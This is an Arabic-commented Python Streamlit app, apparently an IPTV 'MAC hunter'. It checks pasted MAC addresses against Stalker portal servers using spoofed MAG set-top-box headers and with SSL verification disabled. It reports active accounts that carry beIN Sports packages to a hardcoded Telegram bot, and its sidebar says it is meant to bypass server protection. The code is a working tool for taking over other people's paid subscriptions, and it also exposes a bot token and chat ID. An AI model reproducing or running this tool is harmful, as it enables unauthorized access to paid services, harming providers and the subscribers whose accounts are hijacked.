import streamlit as st
import requests
import time
import telebot
import re
import urllib3
import random

# إيقاف تحذيرات SSL لضمان استمرارية الفحص دون توقف
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- إعدادات البوت والبيانات الخاصة بك ---
TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
ID = 7638628794
bot = telebot.TeleBot(TOKEN)

# الباقات المستهدفة (كما في التلغرام الخاص بك)
FAV_CHANNELS = {
    "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
    "IARI BEIN SPORTS 8K": ["8K", "IARI"],
    "IARI BEIN SPORTS 4K": ["4K", "IARI"]
}

# --- واجهة Streamlit ---
st.set_page_config(page_title="Radar Ayoub Hammami Pro", page_icon="📡", layout="wide")

# تصميم مطابق للصور التي أرسلتها
st.markdown("""
    <style>
    .main { background-color: #f0f2f6; }
    .title-text { text-align: center; color: #ff4b4b; font-family: 'Arial'; font-weight: bold; }
    .stButton>button { width: 100%; background-color: #ff4b4b; color: white; border-radius: 8px; }
    </style>
    """, unsafe_allow_html=True)

st.markdown("<h1 class='title-text'>📡 Radar Ayoub Hammami Pro</h1>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center;'>نظام المسح الذكي وحالة السيرفر المباشرة</p>", unsafe_allow_html=True)

# مدخل البيانات
raw_input = st.text_area("انسخ هنا النص العشوائي (روابط وماكات مبعثرة):", height=150, placeholder="http://example.com/c/\n00:1A:79:XX:XX:XX")

def get_stealth_headers(mac):
    """رأسيات طلب متخفية تحاكي أجهزة MAG حقيقية لتجاوز الحظر"""
    return {
        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Safari/533.3',
        'X-User-Agent': 'Model: MAG254; Link: WiFi',
        'Cookie': f'mac={mac}',
        'Referer': 'http://mag.infomir.com/',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    }

if st.button("🚀 بدء المسح الشامل"):
    # استخراج الماكات والروابط تلقائياً
    macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', raw_input.upper())))
    host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', raw_input)
    
    if host_match and macs:
        base_url = host_match.group(0).split('/portal.php')[0].rstrip('/')
        api_url = f"{base_url}/portal.php"
        
        st.info(f"🌐 يتم الفحص على: {base_url}")
        
        # إنشاء الأعمدة للنتائج كما في الصورة الثالثة
        progress_bar = st.progress(0)
        results_container = st.empty()
        
        final_table = []
        found_count = 0

        for i, mac in enumerate(macs):
            headers = get_stealth_headers(mac)
            try:
                # الفحص المباشر (تجاوز فحص الصحة الأولي لتجنب رسالة OFFLINE)
                start_time = time.time()
                r = requests.get(f"{api_url}?type=stb&action=get_profile&force_stb=1", 
                                 headers=headers, timeout=10, verify=False)
                latency = int((time.time() - start_time) * 1000)
                
                if r.status_code == 200 and '"active_cons"' in r.text:
                    active = re.search(r'"active_cons"\s*:\s*"(\d+)"', r.text).group(1)
                    expiry = re.search(r'"end_date"\s*:\s*"([^"]+)"', r.text).group(1) if '"end_date"' in r.text else "N/A"
                    
                    # قياس الاستقرار
                    stab = "قوي ✅" if latency < 1000 else "متقطع ⚠️"
                    
                    # فحص القنوات المفضلة
                    r_ch = requests.get(f"{api_url}?type=itv&action=get_all_channels", 
                                        headers=headers, timeout=10, verify=False)
                    ch_text = r_ch.text.upper()
                    found_favs = [name for name, keys in FAV_CHANNELS.items() if all(k in ch_text for k in keys)]
                    
                    # إرسال تلغرام إذا كان الماك متاحاً (0 متصل)
                    if active == "0":
                        found_count += 1
                        ch_status = "\n".join([f"✅ {c}" for c in found_favs]) if found_favs else "❌ غير متوفرة"
                        
                        alert = (
                            f"🎯 صيد متاح بواسطة Radar Ayoub\n\n"
                            f"🖥️ الماك: {mac}\n"
                            f"📊 الاستقرار: {stab}\n"
                            f"👥 المتصلون: {active}\n"
                            f"📺 القنوات:\n{ch_status}\n\n"
                            f"👤 المالك: Ayoub Hammami"
                        )
                        bot.send_message(ID, alert)
                        st.toast(f"✅ تم صيد: {mac}")

                    final_table.append({
                        "الماك": mac, "الحالة": "يشتغل 🟢", "القوة": stab, 
                        "المستخدمين": active, "تاريخ الانتهاء": expiry, "الباقات": len(found_favs)
                    })
                else:
                    final_table.append({"الماك": mac, "الحالة": "معطل 🔴", "القوة": "-", "المستخدمين": "-", "تاريخ الانتهاء": "-", "الباقات": "-"})
            
            except:
                final_table.append({"الماك": mac, "الحالة": "خطأ اتصال 🔴", "القوة": "-", "المستخدمين": "-", "تاريخ الانتهاء": "-", "الباقات": "-"})
            
            # تحديث الواجهة والتقدم
            progress_bar.progress((i + 1) / len(macs))
            time.sleep(0.5)

        # عرض الجدول النهائي كما في الصورة الثالثة
        st.table(final_table)
        st.balloons()
    else:
        st.error("❌ يرجى إدخال رابط وماكات صحيحة.")

st.sidebar.markdown("### 🤖 My STB Checker Bot")
st.sidebar.info("هذا الرادار مبرمج لصالح أيوب حمامي وتجاوز حماية السيرفرات.")
